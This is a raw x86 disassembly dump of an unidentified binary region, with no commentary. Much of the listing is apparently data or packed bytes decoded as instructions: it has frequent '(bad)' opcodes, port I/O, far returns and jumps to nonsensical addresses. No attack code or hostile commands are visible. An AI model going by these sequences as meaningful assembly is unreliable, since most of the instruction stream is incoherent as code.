  433156:	cld    
  433157:	mov    eax,edi
  433159:	clc    
  43315a:	ret    
  43315b:	ret    0xc645
  43315e:	mov    esi,DWORD PTR [ebx]
  433160:	cld    
  433161:	pop    esi
  433162:	mov    ebx,0x83458bc3
  433168:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  43316c:	dec    ebp
  43316d:	xor    DWORD PTR [ebx],esi
  43316f:	pushf  
  433170:	add    edi,DWORD PTR [edx-0x7767a77]
  433176:	fcom   DWORD PTR [ebp+0x45]
  433179:	mov    esi,DWORD PTR [ebx]
  43317b:	adc    al,0x9c
  43317d:	inc    ebp
  43317e:	(bad)  
  43317f:	mov    ebx,eax
  433181:	adc    al,0x85
  433183:	cmp    al,0x1
  433186:	inc    ebp
  433187:	add    BYTE PTR ds:0xe98b9c4d,bh
  43318d:	mov    eax,DWORD PTR [ebx]
  43318f:	nop
  433190:	add    BYTE PTR [eax],al
  433192:	inc    ebp
  433193:	mov    esi,DWORD PTR [ebx]
  433195:	add    eax,DWORD PTR [ebx]
  433197:	cmp    al,0x89
  433199:	mov    esp,esi
  43319b:	clc    
  43319c:	inc    ebp
  43319d:	inc    ebp
  43319e:	add    edx,DWORD PTR [esi+0xc]
  4331a1:	mov    edi,0x7ff0845
  4331a6:	in     al,dx
  4331a7:	(bad)  
  4331a8:	jne    0x433145
  4331aa:	mov    esi,DWORD PTR [edx]
  4331ac:	clc    
  4331ad:	add    ebp,DWORD PTR [esi]
  4331af:	mov    edi,edi
  4331b1:	in     al,dx
  4331b2:	mov    DWORD PTR [ebp-0x10],eax
  4331b5:	xor    eax,DWORD PTR [ebp+0x3]
  4331b8:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4331be:	fmul   DWORD PTR [ebx-0x173caf39]
  4331c4:	lea    ecx,[ecx+0x45e8d4bc]
  4331ca:	clc    
  4331cb:	mov    edi,edi
  4331cd:	cmp    BYTE PTR [ebp+0x4d],al
  4331d0:	test   DWORD PTR [eax+0x74],ecx
  4331d3:	inc    ecx
  4331d4:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4331da:	ret    
  4331db:	inc    eax
  4331dc:	dec    DWORD PTR [ebx+0x4945f8f0]
  4331e2:	push   eax
  4331e3:	dec    eax
  4331e4:	test   al,0xd0
  4331e6:	dec    eax
  4331e8:	mov    eax,DWORD PTR [ebp-0x14]
  4331eb:	mov    eax,DWORD PTR [ebp+0x38]
  4331ee:	mov    eax,ecx
  4331f0:	fadd   DWORD PTR [ebx]
  4331f2:	dec    ebp
  4331f3:	inc    eax
  4331f4:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4331fa:	inc    ebp
  4331fb:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  433201:	fadd   QWORD PTR [ebx]
  433203:	inc    ebp
  433204:	or     al,0x33
  433206:	dec    ebp
  433207:	add    edi,DWORD PTR [ebx]
  433209:	mov    DWORD PTR [edx-0x28],esi
  43320c:	mov    eax,DWORD PTR [ebp-0x10]
  43320f:	mov    eax,DWORD PTR [eax+0x10]
  433212:	mov    eax,edi
  433214:	lock ret 
  433216:	inc    ecx
  433217:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  43321d:	fsubr  st,st(5)
  43321f:	test   DWORD PTR [eax],eax
  433221:	clc    
  433222:	push   0x45
  433224:	(bad)  
  433225:	cmp    al,0xec
  433227:	pushf  
  433228:	inc    ebp
  433229:	(bad)  
  43322a:	push   eax
  43322b:	fsub   DWORD PTR [eax-0x7b]
  43322e:	(bad)  
  43322f:	clc    
  433230:	mov    eax,0xf8008584
  433235:	mov    eax,DWORD PTR [ebp-0x4]
  433238:	mov    edi,0x4585c3cc
  43323e:	clc    
  43323f:	mov    eax,DWORD PTR [ebp+0x14]
  433242:	xor    eax,DWORD PTR [ebp-0x64]
  433245:	mov    edi,eax
  433247:	in     al,dx
  433248:	les    esi,FWORD PTR [ebp-0x7b]
  43324b:	mov    edi,eax
  43324d:	or     al,0x4d
  43324f:	dec    ebp
  433250:	mov    eax,ebp
  433252:	in     al,0xf2
  433254:	dec    ebp
  433255:	dec    DWORD PTR [ecx+0x4dc7e045]
  43325b:	fmul   DWORD PTR [ecx+0x4df8f085]
  433261:	inc    ebp
  433262:	mov    DWORD PTR [ebx],esi
  433264:	fadd   QWORD PTR [ebx]
  433266:	dec    ebp
  433267:	push   eax
  433268:	xor    eax,DWORD PTR [ebp+0x3]
  43326b:	push   eax
  43326c:	mov    DWORD PTR [eax+ebx*8],ebx
  43326f:	push   esi
  433271:	mov    eax,DWORD PTR [eax]
  433273:	lock cmp eax,0xf84e85c0
  433279:	inc    ebp
  43327a:	test   BYTE PTR [ebx],dh
  43327c:	add    DWORD PTR [ebx],eax
  43327e:	add    BYTE PTR [eax+0x4d],dl
  433281:	jne    0x4332b6
  433283:	lea    ecx,[ebx-0x7617fc44]
  433289:	div    ah
  43328b:	inc    DWORD PTR [ebp+0x45]
  43328e:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433294:	jb     0x433221
  433296:	add    BYTE PTR [eax*2-0x17ba743f],cl
  43329d:	mov    ecx,DWORD PTR [ebp-0x10]
  4332a0:	xor    ecx,DWORD PTR [ebp+0x3]
  4332a3:	mov    edi,DWORD PTR [ebx]
  4332a5:	adc    BYTE PTR [ebp+0x41],dh
  4332a8:	mov    ecx,DWORD PTR [ebx-0x37382704]
  4332ae:	ret    
  4332af:	push   ss
  4332b0:	push   0x45
  4332b2:	lea    ecx,[ebx+0x4de80cb0]
  4332b8:	sti    
  4332b9:	add    edi,edi
  4332bb:	or     BYTE PTR [ebp+0x4d],al
  4332be:	mov    ebp,DWORD PTR [ebx]
  4332c0:	xor    ebp,ecx
  4332c2:	mov    al,BYTE PTR [edx]
  4332c4:	add    eax,0xc7200
  4332c9:	jne    0x433318
  4332cb:	lea    esi,[ebx]
  4332cd:	mov    al,0xf
  4332cf:	call   0xf2994
  4332d4:	shl    DWORD PTR [ecx],0x84
  4332d7:	pushf  
  4332d8:	add    DWORD PTR [ecx+0x4545d000],ecx
  4332de:	mov    esi,DWORD PTR [edx]
  4332e0:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4332e7:	test   DWORD PTR [eax],eax
  4332e9:	clc    
  4332ea:	dec    ebp
  4332eb:	inc    ebp
  4332ec:	xor    edi,DWORD PTR [edi+ecx*1]
  4332ef:	pushf  
  4332f0:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4332f7:	lea    eax,[ecx]
  4332f9:	int3   
  4332fa:	add    BYTE PTR [ebp+0x45],cl
  4332fd:	lea    ecx,[ebx-0x75b2cc38]
  433303:	lea    eax,ds:0x4d72c4
  433309:	mov    ecx,DWORD PTR [ebp-0x4]
  43330c:	xor    ecx,edi
  43330e:	bswap  ebx
  433310:	ror    BYTE PTR [ebp-0x35],0xe9
  433314:	rol    DWORD PTR [ecx],0x84
  433317:	add    BYTE PTR [ecx],al
  433319:	xor    eax,DWORD PTR [eax]
  43331b:	pushf  
  43331c:	inc    ebp
  43331d:	jnp    0x8a436720
  433323:	mov    eax,DWORD PTR ds:0xcf72e8
  433329:	lock dec ebp
  43332b:	retf   
  43332c:	xor    ecx,DWORD PTR [ebp+0xf]
  43332f:	mov    eax,eax
  433331:	fmul   st,st(3)
  433333:	test   ecx,0x19b8484
  433339:	xor    al,BYTE PTR [eax]
  43333b:	mov    DWORD PTR [ebp-0x28],eax
  43333e:	mov    eax,DWORD PTR [ebp+0x33]
  433341:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433347:	ret    
  433348:	add    al,cl
  43334a:	dec    ebp
  43334b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  433351:	add    ecx,DWORD PTR ds:0xc7250
  433357:	inc    ebp
  433358:	rcl    DWORD PTR [eax+0x4d],0x2b
  43335c:	mov    edi,edi
  43335e:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433364:	jb     0x43332d
  433366:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  43336d:	mov    esi,DWORD PTR [ebx]
  43336f:	cld    
  433370:	mov    cl,bh
  433372:	or     eax,0x372b6
  433377:	cmp    ecx,eax
  433379:	jne    0x4333f6
  43337f:	mov    eax,DWORD PTR [ebp-0x20]
  433382:	mov    eax,DWORD PTR [eax]
  433384:	xor    eax,edi
  433386:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  43338d:	mov    ecx,DWORD PTR [ebp-0x4]
  433390:	mov    ecx,edi
  433392:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433398:	jb     0x4333a9
  43339a:	add    BYTE PTR [edi-0x3f],dl
  43339d:	add    BYTE PTR [ebp-0x75],cl
  4333a0:	mov    esi,eax
  4333a2:	xor    eax,DWORD PTR [eax]
  4333a4:	mov    al,bh
  4333a6:	or     eax,0x4b7284
  4333ab:	xor    al,cl
  4333ad:	mov    ecx,DWORD PTR [ebp-0x4]
  4333b0:	mov    ecx,edi
  4333b2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4333b8:	jb     0x4333c9
  4333ba:	add    BYTE PTR [edi],dh
  4333bc:	enter  0x8500,0x8b
  4333c0:	add    ah,bl
  4333c2:	add    BYTE PTR [eax],al
  4333c4:	inc    ebp
  4333c5:	(bad)  
  4333c6:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  4333cd:	mov    esi,DWORD PTR [edx-0x4]
  4333d0:	add    bh,cl
  4333d2:	dec    ebp
  4333d3:	mov    dh,0x8b
  4333d5:	add    esi,DWORD PTR [ebx]
  4333d7:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4333dd:	add    BYTE PTR [eax],al
  4333df:	mov    eax,ecx
  4333e1:	loopne 0x433430
  4333e3:	add    BYTE PTR [ebx-0x757bcc39],cl
  4333e9:	dec    ebx
  4333ea:	or     eax,0x8b7232
  4333ef:	in     al,0xc1
  4333f1:	or     DWORD PTR [ebp-0x31],ecx
  4333f4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4333fb:	xor    dh,BYTE PTR [edx-0x75]
  4333fe:	add    al,dh
  433400:	enter  0x4f09,0xcf
  433404:	inc    ebp
  433405:	mov    WORD PTR [ebx-0x75cdccb5],cs
  43340b:	or     al,BYTE PTR ds:0xe4728b
  433411:	or     DWORD PTR [ebp-0x31],ecx
  433414:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  43341b:	cmp    dh,BYTE PTR [edx+0xf]
  43341e:	add    bl,dl
  433420:	rol    DWORD PTR [eax],0x4d
  433423:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433429:	(bad)  
  43342a:	or     eax,0x4b7284
  43342f:	xor    al,cl
  433431:	mov    ecx,DWORD PTR [ebp-0x20]
  433434:	mov    ecx,DWORD PTR [ecx]
  433436:	xor    ecx,edi
  433438:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43343f:	xor    cl,al
  433441:	mov    ecx,DWORD PTR [edi]
  433443:	fadd   QWORD PTR [ebp+0x9]
  433446:	call   0xffd02f1a
  43344b:	dec    ebx
  43344c:	dec    ebp
  43344d:	xor    bh,BYTE PTR [ebx]
  43344f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  433453:	loopne 0x433451
  433455:	or     edi,eax
  433457:	iret   
  433458:	ret    
  433459:	mov    WORD PTR [ebp+0x4f],es
  43345c:	mov    esi,DWORD PTR [edx]
  43345e:	call   0x8452fb9d
  433463:	(bad)  
  433464:	fwait
  433465:	add    BYTE PTR [edx],dh
  433467:	mov    esi,DWORD PTR [ebx]
  433469:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43346f:	test   BYTE PTR [ebx],dh
  433471:	dec    ebx
  433472:	add    esi,DWORD PTR [edx]
  433474:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  43347a:	dec    edi
  43347c:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  433483:	xor    al,BYTE PTR [ebx]
  433485:	mov    edi,DWORD PTR [ebx]
  433487:	in     al,0x75
  433489:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43348f:	dec    ebx
  433490:	xor    esi,DWORD PTR [edx]
  433492:	lea    ecx,[edx]
  433494:	or     BYTE PTR [ebx+0x900f072],cl
  43349a:	ja     0x43346b
  43349c:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  4334a3:	cmp    ch,al
  4334a5:	jne    0x43349a
  4334a7:	mov    edi,edi
  4334a9:	fadd   QWORD PTR [ebp+0x0]
  4334ac:	mov    eax,edi
  4334ae:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4334b5:	mov    edx,DWORD PTR [ebx]
  4334b7:	in     al,0x45
  4334b9:	or     DWORD PTR [ebx],esi
  4334bb:	iret   
  4334bc:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4334c3:	xor    dl,BYTE PTR [eax-0x75]
  4334c6:	sbb    al,0xe0
  4334c8:	dec    DWORD PTR [ecx]
  4334ca:	mov    ecx,edi
  4334cc:	in     al,dx
  4334cd:	mov    eax,es
  4334cf:	dec    ebx
  4334d0:	mov    DWORD PTR [edx],esi
  4334d2:	fmul   QWORD PTR [edx]
  4334d4:	jne    0x433461
  4334d6:	(bad)  
  4334d7:	(bad)  
  4334d9:	or     DWORD PTR [ebp-0x31],eax
  4334dc:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4334e3:	cmp    bh,bh
  4334e5:	jne    0x43352c
  4334e7:	lea    ecx,[ebx-0x38372750]
  4334ed:	inc    ebx
  4334ef:	mov    eax,ecx
  4334f1:	mov    eax,0xa00c111
  4334f6:	jne    0x43353d
  4334f8:	mov    esi,DWORD PTR [ebx]
  4334fa:	test   al,0x3
  4334fc:	inc    ebp
  4334fd:	mov    DWORD PTR [eax-0xc],edx
  433500:	loop   0x433547
  433502:	push   DWORD PTR [ebx]
  433504:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  43350a:	add    DWORD PTR [eax],eax
  43350c:	mov    eax,edi
  43350e:	lods   al,BYTE PTR ds:[esi]
  43350f:	dec    ebp
  433510:	inc    ebp
  433511:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433517:	retf   
  433518:	mov    edx,ecx
  43351a:	adc    al,0x84
  43351c:	(bad)  
  43351d:	std    
  43351e:	ret    
  43351f:	jmp    FWORD PTR [edi-0x2b7474bb]
  433525:	hlt    
  433526:	rol    edi,0x82
  433529:	ret    
  43352a:	cld    
  43352b:	enter  0x11ff,0x45
  43352f:	inc    ebp
  433530:	pop    edi
  433531:	mov    ebx,DWORD PTR [ebx+0x14]
  433534:	ret    0xc7
  433537:	test   BYTE PTR [ebx+0x4532519b],cl
  43353d:	jmp    0x4334ca
  43353f:	push   0x8
  433541:	call   DWORD PTR [esi]
  433543:	in     al,dx
  433544:	add    BYTE PTR [ebp+0x1],0x50
  433548:	add    bh,ah
  43354a:	add    bh,bh
  43354c:	icebp  
  43354d:	mov    ecx,DWORD PTR [eax]
  43354f:	cld    
  433550:	pop    es
  433551:	dec    ebp
  433552:	shl    DWORD PTR [ebx],0x72
  433555:	add    eax,DWORD PTR [eax]
  433557:	cmp    edx,ecx
  433559:	je     0x43356b
  43355b:	mov    esi,DWORD PTR [ebp-0x4]
  43355e:	inc    edi
  433560:	or     al,0xc3
  433562:	jmp    FWORD PTR [edx-0x18]
  433565:	(bad)  
  433566:	sti    
  433567:	cwde   
  433568:	(bad)  
  433569:	call   0xffa12e74
  43356e:	or     al,0x45
  433570:	push   ebp
  433571:	sub    esp,0x18
  433574:	push   ebx
  433575:	inc    ebp
  433576:	mov    edi,edi
  433578:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43357f:	test   al,0x54
  433581:	inc    ebp
  433582:	push   ecx
  433583:	push   eax
  433584:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  43358a:	add    ah,bh
  43358c:	(bad)  
  43358d:	dec    ebp
  43358e:	add    DWORD PTR [ebx],esi
  433590:	inc    ebp
  433591:	add    ecx,DWORD PTR [ebx+0x74943b]
  433597:	push   0xffffff8b
  433599:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43359f:	add    eax,DWORD PTR [ecx]
  4335a1:	or     BYTE PTR [eax],al
  4335a3:	call   0xff852da8
  4335a8:	mov    eax,DWORD PTR [ebp+0x14]
  4335ab:	mov    ecx,DWORD PTR [ecx+0x801ac]
  4335b1:	inc    ebp
  4335b2:	dec    ecx
  4335b3:	add    ebp,DWORD PTR [edx+0x14]
  4335b6:	push   0x8b3045
  4335bb:	call   0x33ad8330
  4335c0:	inc    DWORD PTR [ebx]
  4335c2:	mov    DWORD PTR [edi],ecx
  4335c4:	mov    eax,ecx
  4335c6:	or     BYTE PTR [ebp-0x3d],cl
  4335c9:	cmp    eax,edi
  4335cb:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4335d0:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4335d6:	adc    al,0xc9
  4335d8:	inc    ebp
  4335d9:	adc    BYTE PTR [eax+0x55],dl
  4335dc:	jne    0x4335ca
  4335de:	call   0xff54356e
  4335e3:	dec    ebp
  4335e4:	inc    ebp
  4335e5:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4335eb:	add    BYTE PTR [ebx],bh
  4335ed:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4335f1:	push   esp
  4335f2:	or     al,0x51
  4335f4:	dec    ebp
  4335f5:	xor    DWORD PTR [ebx],0xf32039b
  4335fb:	cmp    eax,DWORD PTR [ebp+0x74]
  4335fe:	mov    edi,edi
  433600:	pop    edi
  433601:	adc    BYTE PTR [ebx+0x75],bl
  433604:	ret    0x50
  433607:	mov    edx,DWORD PTR ss:[edi-0x7d]
  43360b:	(bad)  
  43360c:	clc    
  43360d:	mov    esp,ebp
  43360f:	pop    ecx
  433610:	mov    ecx,0xf80085c2
  433615:	mov    ecx,DWORD PTR [ecx+edx*2]
  433618:	push   esi
  433619:	push   esi
  43361a:	(bad)  
  43361b:	lock add DWORD PTR [ebp+0x44],eax
  43361f:	mov    edx,DWORD PTR [eax]
  433621:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433625:	or     BYTE PTR [edi+eax*1+0x51],dl
  433629:	ret    
  43362a:	xor    ebx,DWORD PTR [ebx+0x37232be]
  433630:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433636:	or     al,0x80
  433638:	jge    0x43363b
  43363a:	mov    DWORD PTR [eax],eax
  43363c:	and    al,0x8
  43363e:	cmp    DWORD PTR [ebp+0x10],eax
  433641:	mov    edx,DWORD PTR [esi]
  433643:	xchg   esp,eax
  433644:	dec    esp
  433645:	add    BYTE PTR [eax],dl
  433647:	mov    ecx,edx
  433649:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43364d:	dec    ebp
  43364e:	into   
  43364f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433655:	mov    edx,DWORD PTR [eax+0x14]
  433658:	das    
  433659:	add    al,0x45
  43365b:	add    BYTE PTR [ebp+0x0],dh
  43365e:	mov    edi,edi
  433660:	and    al,0x50
  433662:	mov    eax,DWORD PTR [eax]
  433664:	and    al,0xd1
  433666:	xor    eax,DWORD PTR [esi]
  433668:	lea    eax,[ebp+0x8]
  43366b:	xor    esi,DWORD PTR [edx+0x3]
  43366e:	add    BYTE PTR [ecx+0x4510fc44],cl
  433674:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  43367a:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433684:	cmp    al,0xff
  433686:	pushf  
  433687:	mov    edi,edi
  433689:	or     BYTE PTR [esi+ecx*1],cl
  43368c:	jne    0x433651
  43368e:	call   0xc365a
  433693:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433697:	mov    ebx,DWORD PTR [eax]
  433699:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  43369d:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  4336a5:	pop    esi
  4336a6:	and    al,0xc9
  4336a8:	call   DWORD PTR [eax]
  4336aa:	and    al,0x55
  4336ac:	call   0x28359d
  4336b1:	add    DWORD PTR [eax+edx*1+0xc],0x31
  4336b6:	clc    
  4336b7:	pushf  
  4336b8:	dec    DWORD PTR [ecx+0x57892474]
  4336be:	jmp    0x433701
  4336c0:	and    al,0x89
  4336c2:	and    al,0x24
  4336c4:	or     BYTE PTR [ebx-0x45ebdbe8],cl
  4336ca:	dec    DWORD PTR [eax]
  4336cc:	and    al,0x7
  4336ce:	pop    esi
  4336cf:	cli    
  4336d0:	in     eax,0x9b
  4336d2:	ret    0x32
  4336d5:	add    eax,edx
  4336d7:	mov    DWORD PTR [ebx+0x688b8924],ebx
  4336dd:	or     al,0xf8
  4336df:	jl     0x43375e
  4336e1:	adc    al,0x9c
  4336e3:	dec    ebp
  4336e4:	push   0xff8b7575
  4336e9:	and    al,0xff
  4336eb:	xor    edi,edi
  4336ed:	mov    esi,DWORD PTR [esp-0x75]
  4336f1:	add    ecx,DWORD PTR [ebx+0x4cca0c0f]
  4336f7:	or     bl,ch
  4336f9:	cmp    DWORD PTR [eax],edx
  4336fb:	sbb    al,0x44
  4336fd:	or     BYTE PTR [eax+edx*1-0x7c],cl
  433701:	xor    ah,BYTE PTR [eax*4-0x7a8accf2]
  433708:	or     BYTE PTR [ecx*4+0x5d5fbf74],ah
  43370f:	test   eax,0x83001010
  433714:	dec    eax
  433715:	adc    BYTE PTR [eax],al
  433717:	adc    edi,DWORD PTR [edx+0x10]
  43371a:	add    cl,bh
  43371c:	jae    0x43372e
  43371e:	add    BYTE PTR [ebx-0x4bffefb4],dh
  433724:	pop    eax
  433725:	adc    BYTE PTR [eax],al
  433727:	fidiv  DWORD PTR [ebp+0x10]
  43372a:	add    dh,bl
  43372c:	movups xmm0,XMMWORD PTR [eax]
  43372f:	popf   
  433730:	push   cs
  433731:	adc    BYTE PTR [eax],al
  433733:	ins    DWORD PTR es:[edi],dx
  433734:	or     BYTE PTR [eax],dl
  433736:	add    BYTE PTR [ebx+eiz*2+0x370f0010],cl
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [ebx],dl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [edi],dl
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [ebx],bl
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [edi],bl
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [ebx],ah
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [edi],ah
  433754:	aaa    
  433755:	inc    ebx
  433756:	add    BYTE PTR [ebx],ch
  433758:	aaa    
  433759:	inc    ebx
  43375a:	add    BYTE PTR [edi],ch
  43375c:	aaa    
  43375d:	inc    ebx
  43375e:	add    BYTE PTR [ebx],dh
  433760:	aaa    
  433761:	inc    ebx
  433762:	add    BYTE PTR [edi],dh
  433764:	aaa    
  433765:	inc    ebx
  433766:	add    BYTE PTR [ebx-0x73ffefdd],bh
  43376c:	cmp    al,0x10
  43376e:	add    BYTE PTR [ebx+0x30],cl
  433771:	adc    BYTE PTR [eax],al
  433773:	sub    al,0xc
  433775:	adc    BYTE PTR [eax],al
  433777:	push   ds
  433778:	adc    BYTE PTR ds:[eax],al
  43377b:	mov    bh,0x56
  43377d:	adc    BYTE PTR [eax],al
  43377f:	adc    eax,DWORD PTR [eax+edx*1+0x0]
  433783:	cmp    al,0x4f
  433785:	adc    BYTE PTR [eax],al
  433787:	addr16 aaa 
  433789:	inc    ebx
  43378a:	add    BYTE PTR [ebx+0x37],ch
  43378d:	inc    ebx
  43378e:	add    BYTE PTR [edi+0x37],ch
  433791:	inc    ebx
  433792:	add    BYTE PTR [ebx+0x37],dh
  433795:	inc    ebx
  433796:	add    BYTE PTR [edi+0x37],dh
  433799:	inc    ebx
  43379a:	add    BYTE PTR [ebx+0x37],bh
  43379d:	inc    ebx
  43379e:	add    BYTE PTR [edi+0x37],bh
  4337a1:	inc    ebx
  4337a2:	add    BYTE PTR [ebx-0x23ffbcc9],al
  4337a8:	pop    esp
  4337a9:	adc    BYTE PTR [eax],al
  4337ab:	jle    0x4337cd
  4337ad:	adc    BYTE PTR [eax],al
  4337af:	cld    
  4337b0:	dec    edx
  4337b1:	adc    BYTE PTR [eax],al
  4337b3:	add    al,0xb
  4337b5:	adc    BYTE PTR [eax],al
  4337b7:	push   ebx
  4337b8:	ins    DWORD PTR es:[edi],dx
  4337b9:	adc    BYTE PTR [eax],al
  4337bb:	fs jl  0x4337ce
  4337be:	add    BYTE PTR [edx+0x42001015],ah
  4337c4:	jge    0x4337d6
  4337c6:	add    BYTE PTR [edi-0x54ffbcc9],ah
  4337cc:	aaa    
  4337cd:	inc    ebx
  4337ce:	add    BYTE PTR [edi-0x4cffbcc9],ch
  4337d4:	aaa    
  4337d5:	inc    ebx
  4337d6:	add    BYTE PTR [edi-0x44ffbcc9],dh
  4337dc:	aaa    
  4337dd:	inc    ebx
  4337de:	add    BYTE PTR [edi-0x3cffbcc9],bh
  4337e4:	aaa    
  4337e5:	inc    ebx
  4337e6:	add    BYTE PTR [edi+0x2300103a],ah
  4337ec:	aas    
  4337ed:	adc    BYTE PTR [eax],al
  4337ef:	jne    0x4337fc
  4337f1:	adc    BYTE PTR [eax],al
  4337f3:	fldenv [esi]
  4337f5:	adc    BYTE PTR [eax],al
  4337f7:	xchg   esp,eax
  4337f8:	push   0x10
  4337fa:	add    bl,ah
  4337fc:	pop    eax
  4337fd:	adc    BYTE PTR [eax],al
  4337ff:	in     al,0x2f
  433801:	adc    BYTE PTR [eax],al
  433803:	leave  
  433804:	sbb    DWORD PTR [eax],edx
  433806:	add    bh,ah
  433808:	aaa    
  433809:	inc    ebx
  43380a:	add    bl,ch
  43380c:	aaa    
  43380d:	inc    ebx
  43380e:	add    bh,ch
  433810:	aaa    
  433811:	inc    ebx
  433812:	add    bl,dh
  433814:	aaa    
  433815:	inc    ebx
  433816:	add    bh,dh
  433818:	aaa    
  433819:	inc    ebx
  43381a:	add    bl,bh
  43381c:	aaa    
  43381d:	inc    ebx
  43381e:	add    bh,bh
  433820:	aaa    
  433821:	inc    ebx
  433822:	add    BYTE PTR [ebx],al
  433824:	cmp    BYTE PTR [ebx+0x0],al
  433827:	mov    ebp,0x1d001062
  43382c:	adc    BYTE PTR [eax],dl
  43382e:	add    BYTE PTR [edi+0x51],dl
  433831:	adc    BYTE PTR [eax],al
  433833:	dec    eax
  433834:	ins    DWORD PTR es:[edi],dx
  433835:	adc    BYTE PTR [eax],al
  433837:	mov    eax,DWORD PTR [edi]
  433839:	adc    BYTE PTR [eax],al
  43383b:	mov    ah,0x7
  43383d:	adc    BYTE PTR [eax],al
  43383f:	ror    DWORD PTR [esi],1
  433841:	adc    BYTE PTR [eax],al
  433843:	pop    edi
  433844:	inc    ebp
  433845:	adc    BYTE PTR [eax],al
  433847:	daa    
  433848:	cmp    BYTE PTR [ebx+0x0],al
  43384b:	sub    edi,DWORD PTR [eax]
  43384d:	inc    ebx
  43384e:	add    BYTE PTR [edi],ch
  433850:	cmp    BYTE PTR [ebx+0x0],al
  433853:	xor    edi,DWORD PTR [eax]
  433855:	inc    ebx
  433856:	add    BYTE PTR [edi],dh
  433858:	cmp    BYTE PTR [ebx+0x0],al
  43385b:	cmp    edi,DWORD PTR [eax]
  43385d:	inc    ebx
  43385e:	add    BYTE PTR [edi],bh
  433860:	cmp    BYTE PTR [ebx+0x0],al
  433863:	inc    ebx
  433864:	cmp    BYTE PTR [ebx+0x0],al
  433867:	dec    ecx
  433868:	ss push eax
  43386a:	pop    edi
  43386b:	ss inc ebx
  43386d:	ss pop edx
  43386f:	xor    ebx,DWORD PTR [edi+0x52]
  433872:	add    BYTE PTR [edi+ecx*2+0x32],dl
  433876:	pop    edi
  433877:	dec    esi
  433878:	dec    esp
  433879:	dec    eax
  43387a:	xor    esi,DWORD PTR [edx]
  43387c:	pop    edi
  43387d:	xor    al,0x4b
  43387f:	add    BYTE PTR [eax+0x49],cl
  433882:	push   ebp
  433883:	xor    al,0x5f
  433885:	dec    esp
  433886:	inc    edx
  433887:	dec    ecx
  433888:	cmp    DWORD PTR [edi+ebx*2],esi
  43388b:	pop    ecx
  43388c:	inc    edi
  43388d:	add    BYTE PTR [eax+0x50],bl
  433890:	dec    eax
  433891:	pop    edi
  433892:	push   ebp
  433893:	push   ecx
  433894:	inc    edi
  433895:	xor    cl,BYTE PTR [edx+0x38]
  433898:	push   esi
  433899:	add    BYTE PTR [ebx+0x4a],al
  43389c:	push   edx
  43389d:	pop    edi
  43389e:	dec    edi
  43389f:	dec    eax
  4338a0:	dec    edi
  4338a1:	dec    edi
  4338a2:	dec    edx
  4338a3:	add    BYTE PTR [ecx+0x52],al
  4338a6:	cmp    DWORD PTR [edi+0x56],ebx
  4338a9:	aaa    
  4338aa:	dec    esp
  4338ab:	cmp    DWORD PTR [ebx+0x5f],eax
  4338ae:	push   edx
  4338af:	inc    esp
  4338b0:	add    BYTE PTR [ecx+0x37],bl
  4338b3:	inc    esp
  4338b4:	pop    edi
  4338b5:	dec    ecx
  4338b6:	xor    esi,DWORD PTR [edi]
  4338b8:	xor    DWORD PTR [edi+0x49],ebx
  4338bb:	push   esp
  4338bc:	xor    eax,DWORD PTR [eax]
  4338be:	push   edx
  4338bf:	xor    BYTE PTR [eax+0x5f],bl
  4338c2:	dec    eax
  4338c3:	push   edi
  4338c4:	inc    esi
  4338c5:	xor    DWORD PTR [edi+0x5f],edx
  4338c8:	cmp    BYTE PTR [ebx+0x37],dl
  4338cb:	add    BYTE PTR [esi+0x42],dl
